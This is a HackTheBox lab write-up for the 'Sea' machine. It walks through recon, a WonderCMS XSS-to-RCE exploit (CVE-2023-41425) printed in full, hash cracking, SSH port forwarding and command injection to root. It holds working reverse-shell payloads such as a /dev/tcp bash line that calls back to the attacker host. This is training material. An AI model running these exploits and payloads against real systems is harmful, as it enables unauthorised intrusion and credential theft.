---
title: "HTB - Sea"
date: 2024-09-02
draft: true
summary: "Writeup for Sea, an easy difficulty Linux machine from HackTheBox."
tags: ["hackthebox", "linux", "easy"]
---

#### Recon
###### Nmap scan
Found two services up:
- TCP port 22 - SSH
- TCP port 80 - HTTP
```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sea-linux]
└─$ sudo nmap -p- --min-rate 10000 10.10.11.28
[sudo] password for chronopad:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 15:07 WIB
Nmap scan report for 10.10.11.28
Host is up (0.39s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sea-linux]
└─$ sudo nmap -p 22,80 -sCV 10.10.11.28
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-02 15:08 WIB
Nmap scan report for 10.10.11.28
Host is up (0.37s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Sea - Home
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

###### TCP port 80 - sea.htb
http://sea.htb/home
![[Pasted image 20240902151021.png]]

http://sea.htb/how-to-participate
![[Pasted image 20240902151137.png]]

http://sea.htb/contact.php
![[Pasted image 20240902151205.png]]

The website uses PHP. There is a `PHPSESSID` cookie, with `httponly` flag not set. This might hint into XSS vulnerability.

Found comments that might hint to something:
- `<!-- Admin CSS -->`
- `<!-- Theme CSS -->`
![[Pasted image 20240902151419.png]]

Test for XSS in */contact.php*.
![[Pasted image 20240902151914.png]]

XSS confirmed on the *website* field:
```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sea-linux]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.28 - - [02/Sep/2024 15:19:58] code 404, message File not found
10.10.11.28 - - [02/Sep/2024 15:19:58] "GET /website HTTP/1.1" 404 -
```

###### Subdomain fuzzing
No subdomains are found.
```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sea-linux]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://sea.htb -H 'Host: FUZZ.sea.htb' -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://sea.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.sea.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
...SNIP...
```

###### Directory fuzzing
Initial directory fuzzing, found *themes*, *data*, and *plugins* directory.
```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sea-linux]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://sea.htb/FUZZ -e .php -ic -t 80

...SNIP...
themes                  [Status: 301, Size: 230, Words: 14, Lines: 8, Duration: 4720ms]
data                    [Status: 301, Size: 228, Words: 14, Lines: 8, Duration: 763ms]
index.php               [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 5712ms]
plugins                 [Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 5733ms]
contact.php             [Status: 200, Size: 2731, Words: 821, Lines: 119, Duration: 5942ms]
home                    [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 606ms]
messages                [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 208ms]
```

Fuzz in */data*. Found *files* directory.
```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sea-linux]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://sea.htb/data/FUZZ -e .php -ic -t 80

files                   [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 225ms]
```

Fuzz in */data/files*. Found nothing.
```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sea-linux]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://sea.htb/data/files/FUZZ -e .php -ic -t 80
```

Fuzz in */themes*. Found *bike* directory.
```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sea-linux]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://sea.htb/themes/FUZZ -e .php -ic -t 80

bike                    [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 358ms]
```

Fuzz in */themes/bike*. Found some interesting files.
```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sea-linux]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://sea.htb/themes/bike/FUZZ -e .php -ic -t 80

LICENSE                 [Status: 200, Size: 1067, Words: 152, Lines: 22, Duration: 369ms]
version                 [Status: 200, Size: 6, Words: 1, Lines: 2, Duration: 186ms]
summary                 [Status: 200, Size: 66, Words: 9, Lines: 2, Duration: 184ms]
```

The *LICENSE* file found indicates that there's a *README.md* file too. Access it directly and turns out it does exists.
![[Pasted image 20240902153741.png|400]]

Check version in */themes/bike/version* and see that it is version 3.2.0, so the website uses `WonderCMS 3.2.0` for the theme of the website.

#### Shell as www-data
###### Exploiting XSS
The `WonderCMS 3.2.0` used by the website is vulnerable to [CVE-2023-41425](https://github.com/prodigiousMind/CVE-2023-41425), allowing RCE via XSS vulnerability, which is found at */contact.php* endpoint. Clone the repository in the PoC link given above, then check the source code *exploit.py*. The exploit script has some bugs, so it has to be modified slightly. Here is the final exploit script.

*exploit.py*
```
# Author: prodigiousMind
# Exploit: Wondercms 4.3.2 XSS to RCE


import sys
import requests
import os
import bs4

if (len(sys.argv)<4): print("usage: python3 exploit.py loginURL IP_Address Port\nexample: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252")
else:
  data = '''
var url = "http://sea.htb";
var token = document.querySelectorAll('[name="token"]')[0].value;
var urlRev = url+"/?installModule=http://10.10.16.2:8000/main_modified.zip&directoryName=violet&type=themes&token=" + token;
var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", urlRev);
xhr3.send();
xhr3.onload = function() {
 if (xhr3.status == 200) {
   var xhr4 = new XMLHttpRequest();
   xhr4.withCredentials = true;
   xhr4.open("GET", url+"/themes/revshell-main/rev.php");
   xhr4.send();
   xhr4.onload = function() {
     if (xhr4.status == 200) {
       var ip = "'''+str(sys.argv[2])+'''";
       var port = "'''+str(sys.argv[3])+'''";
       var xhr5 = new XMLHttpRequest();
       xhr5.withCredentials = true;
       xhr5.open("GET", url+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
       xhr5.send();

     }
   };
 }
};
'''
  try:
    open("xss.js","w").write(data)
    print("[+] xss.js is created")
    print("[+] execute the below command in another terminal\n\n----------------------------\nnc -lvp "+str(sys.argv[3]))
    print("----------------------------\n")
    XSSlink = str(sys.argv[1]).replace("loginURL","index.php?page=loginURL?")+"\"></form><script+src=\"http://"+str(sys.argv[2])+":8000/xss.js\"></script><form+action=\""
    XSSlink = XSSlink.strip(" ")
    print("send the below link to admin:\n\n----------------------------\n"+XSSlink)
    print("----------------------------\n")

    print("\nstarting HTTP server to allow the access to xss.js")
    os.system("python3 -m http.server\n")
  except: print(data,"\n","//write this to a file")
```

Download the reverse shell used, then check the source code *rev.php*. Change the IP and the port according to our machine. After that, zip it back.

*rev.php*
```
...SNIP...
set_time_limit (0);
$VERSION = "1.0";   // CHANGE THIS
$ip = '10.10.16.2';  // CHANGE THIS
$port = 1337;
...SNIP...
```

Run the exploit script and submit the given XSS payload through the form.

![[Pasted image 20240902171620.png]]

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sea-linux/CVE-2023-41425]
└─$ python3 exploit.py http://sea.htb/loginURL 10.10.16.2 1337
[+] xss.js is created
[+] execute the below command in another terminal

----------------------------
nc -lvp 1337
----------------------------

send the below link to admin:

----------------------------
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.16.2:8000/xss.js"></script><form+action="
----------------------------


starting HTTP server to allow the access to xss.js
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.28 - - [02/Sep/2024 17:54:39] "GET /xss.js HTTP/1.1" 200 -
10.10.11.28 - - [02/Sep/2024 17:54:49] "GET /main_modified.zip HTTP/1.1" 200 -
10.10.11.28 - - [02/Sep/2024 17:54:51] "GET /main_modified.zip HTTP/1.1" 200 -
10.10.11.28 - - [02/Sep/2024 17:54:52] "GET /main_modified.zip HTTP/1.1" 200 -
10.10.11.28 - - [02/Sep/2024 17:54:53] "GET /main_modified.zip HTTP/1.1" 200 -
```

You will then get a shell.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sea-linux/CVE-2023-41425]
└─$ nc -lvp 1337
listening on [any] 1337 ...
connect to [10.10.16.2] from sea.htb [10.10.11.28] 34154
Linux sea 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 10:56:11 up 10 min,  0 users,  load average: 0.63, 0.22, 0.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

#### Shell as amay
###### Upgrade shell
Upgrade the shell by running:
- `script /dev/null -c bash`
- `Ctrl+Z` to background process
- `stty raw -echo; fg`

###### Enumeration
Since we are `www-data`, go to */var/www* and start enumerating here and look for credentials or a way to privilege escalate. In */sea/data*, there is the file *database.js* that contains a password hash, likely to be hashed with bcrypt.
- `$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q`

![[Pasted image 20240902191321.png]]

###### Crack hash
Identify the hash with `haiti`:
```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sea-linux/CVE-2023-41425]
└─$ haiti '$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/P
jDnXm4q'
bcrypt [HC: 3200] [JtR: bcrypt]
Blowfish(OpenBSD) [HC: 3200] [JtR: bcrypt]
Woltlab Burning Board 4.x
```

Use `hashcat` to crack the hash. Found password `mychemicalromance`.
```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sea-linux/CVE-2023-41425]
└─$ hashcat -m 3200 cred.hash ~/Arsenal/wordlists/rockyou.txt
...SNIP...
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
```

There are two normal users on the machine, which can be checked by listing the directories in */home*, which are `amay` and `geo`. Credential worked for `amay`.

#### Shell as root 
###### Traditional enumeration
```
# Kernel information
amay@sea:~$ uname -a
Linux sea 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux

# OS release information
amay@sea:~$ cat /etc/os-release
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal

# Environment variables
amay@sea:~$ env
SHELL=/bin/bash
PWD=/home/amay
LOGNAME=amay
XDG_SESSION_TYPE=tty
HOME=/home/amay
APACHE_LOG_DIR=/var/log/apache2
LANG=en_US.UTF-8
...SNIP...
```

Nothing interesting can be found. Run `netstat` to check the internal ports connection.

![[Pasted image 20240902200417.png]]

Apparently a lot of internal ports are connected to `localhost:http-alt`, which is TCP port 8080. This indicates that there is a service running on that port. 

###### Port forwarding + exploit
Use `ssh` to do port forwarding and access the port 8080.

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sea-linux/CVE-2023-41425]
└─$ ssh -L 8888:localhost:8080 amay@sea.htb
amay@sea.htb's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)
```

Now connect to *localhost:8888*. You will be asked for credentials. Login to the website using `amay`'s credentials `amay:mychemicalromance`.

![[Pasted image 20240902200746.png]]

If we choose a file and analyze, in this case *access.log*, it will print out the contents of *access.log*. This means the request can just be intercepted and modified with the name of another file, granting arbitrary read. Use this to read */root/root.txt*.

![[Pasted image 20240902201853.png]]

###### Getting root shell
The *log_file* parameter above is also vulnerable to command injection, so add a reverse shell payload: `bash -c 'bash -i >& /dev/tcp/10.10.16.2/1338 0>&1'`. 

Final payload for *log_file* parameter:
```
log_file=%3d%2froot%2froot.txt%3bbash%20-c%20'bash%20-i%20%3e%26%20%2fdev%2ftcp%2f10.10.16.2%2f1338%200%3e%261'%20%3bls
```

```
┌──(chronopad㉿VincentXPS)-[~/HTB/newlabs/sea-linux/CVE-2023-41425]
└─$ nc -lvnp 1338
listening on [any] 1338 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.11.28] 37196
bash: cannot set terminal process group (32091): Inappropriate ioctl for device
bash: no job control in this shell
root@sea:~/monitoring#
```

Sadly this shell only works for a couple of seconds, so either print the flag by specifying */root/root.txt* directly on *log_file* parameter or do `cat ../root.txt`.

#### Result
###### Flags
- user: `dae0928e887d534b32f78c87693f5a8b`
- root: `630802fd43be7516798c7442076f4b70`

###### Summary
**Foothold**
- Find out the technology / framework the website uses. This can be done through fuzzing and checking directories. Different framework has different structure to the website.
- New wordlists:
	- `/usr/share/seclists/Discovery/Web-Content/quickhits.txt`
	- `/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt`
- See what a script does, and try to modify them to fit your own needs.

**Lateral Movement**
- Check for environment variables and files for credentials.
- Verify hash first using `haiti` before cracking. Check if the hash contains unnecessary characters.

**Privilege Escalation**
- Check for `sudo` permission and running services.
- Do port forwarding if needed (using SSH works).
